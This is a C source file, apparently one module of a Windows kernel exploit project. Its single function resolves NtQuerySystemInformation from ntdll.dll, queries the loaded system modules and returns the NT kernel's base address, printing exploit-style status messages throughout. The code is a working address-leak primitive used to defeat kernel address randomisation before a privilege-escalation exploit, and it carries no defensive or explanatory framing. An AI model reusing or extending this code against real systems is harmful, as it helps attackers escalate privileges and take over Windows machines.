#include "exploit.h"
#include "leak.h"

void* leak_ntoskrnl_base_address()
{
	PSYSTEM_MODULE_INFORMATION module_info;
	HMODULE h_ntdll = 0;
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	unsigned long return_length = 0;
	long status = 0;
	unsigned char unused = 0;

	RtlSecureZeroMemory(&module_info, sizeof(module_info));

	h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the \"ntdll.dll\" API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" API library. Handle Value: 0x%p", h_ntdll);

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Located the \"NtQuerySystemInformation\" function. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	status = _NtQuerySystemInformation(SystemModuleInformation, module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information.");

	if (module_info)
	{
		printf("\n[+] Leaked the NT kernel base address. NT Kernel Base Address: 0x%p", module_info->Modules[0].ImageBaseAddress);
		return module_info->Modules[0].ImageBaseAddress;
	}

	printf("\n[-] Failed to leak the NT kernel base address.");
	unused = getchar();
	return 0;
}